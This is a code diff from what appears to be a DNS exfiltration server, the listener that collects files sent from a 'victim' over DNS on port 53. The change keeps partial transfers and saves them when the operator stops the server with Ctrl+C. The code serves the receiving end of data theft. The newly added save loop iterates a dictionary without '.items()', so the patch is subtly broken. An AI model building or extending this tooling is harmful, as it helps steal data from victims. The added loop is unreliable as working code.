@@ -432,8 +432,8 @@ Advanced:\n"""
     p_cmds(s, b, ip, z, domain, args.force_ip)
     logger.info("Once files have sent, use Ctrl+C to exit and save.")
 
+    r_data = {}  # map of: file-name -> (map of: index -> transmitted data)
     try:
-        r_data = {}  # map of: file-name -> (map of: index -> transmitted data)
         while 1:
             # There is a bottle neck in this function, if very slow PC, will take
             # slightly longer to send as this main loop recieves the data from victim.
@@ -505,5 +505,13 @@ Advanced:\n"""
             # print r_data
 
     except KeyboardInterrupt:
-        logger.info("DNS server stop listening", ip=ip, port=53)
-        udp.close()
+        logger.info("Received Ctrl+C stopping")
+
+    # check if we have open files and save them as is
+    if len(r_data) > 0:
+        logger.info("Saving unfinished files")
+        for fname, value in r_data:
+            save_file(fname, value, z)
+
+    logger.info("DNS server stop listening", ip=ip, port=53)
+    udp.close()
